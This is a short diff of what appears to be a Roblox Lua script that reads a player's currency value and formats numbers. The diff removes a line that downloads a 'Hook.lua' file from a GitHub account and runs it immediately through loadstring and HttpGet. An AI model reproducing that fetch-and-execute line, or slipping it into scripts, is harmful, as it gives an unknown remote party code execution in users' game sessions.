@@ -2,8 +2,6 @@
 local Profit = game.Players.LocalPlayer.DataFolder.Currency.Value
 local Tick = os.time()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/mrhackerman35297/Data/main/Hook.lua"))()
-
 local money = function(Num)
 	return tostring(Num):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
 end
